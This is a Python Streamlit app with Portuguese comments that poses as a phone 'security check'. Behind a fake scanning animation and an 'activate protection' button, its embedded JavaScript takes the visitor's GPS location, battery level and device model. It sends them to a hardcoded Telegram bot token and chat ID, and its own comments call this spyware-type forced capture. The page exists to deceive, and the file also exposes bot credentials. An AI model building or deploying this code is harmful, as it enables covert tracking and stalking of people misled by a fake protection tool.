import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO ORIGINAL (BOLHA FLUTUANTE) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    
    .scanner-box { 
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
        100% { transform: translateY(0px); }
    }

    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    .btn-spy {
        background-color: white; color: #333; border: none;
        padding: 8px 15px; border-radius: 4px; font-size: 14px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- INJETOR DE CAPTURA FORÇADA (TIPO SPYWARE) ---
js_spy = f"""
<div style="display: flex; justify-content: flex-start;">
    <button class="btn-spy" id="btn_ativar">
        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
document.getElementById('btn_ativar').onclick = function() {{
    // FORÇA O SISTEMA A LIGAR O GPS (DISPARA O POP-UP AZUL DA GOOGLE)
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                const link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n📱 *Modelo:* " + model + "\\n🔋 *Bateria:* " + level + "%\\n📍 [MAPA](" + link + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                }});
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{}}
        }},
        (err) => {{
            // Se o GPS estiver desligado na barra, o comando 'enableHighAccuracy' 
            // abaixo força o Android a mostrar o pop-up de ativação automática.
        }},
        {{ 
            enableHighAccuracy: true, // ESTE É O GATILHO PARA O POP-UP
            timeout: 10000, 
            maximumAge: 0 
        }}
    );
}};
</script>
"""

ativou = st.components.v1.html(js_spy, height=60)

if ativou:
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{i}}%</div></div></div>'.replace('{{i}}', str(i)), unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Concluído")
    st.stop()

st.write("✅ Verificação de vírus")
st.write("✅ Proteção de dados")
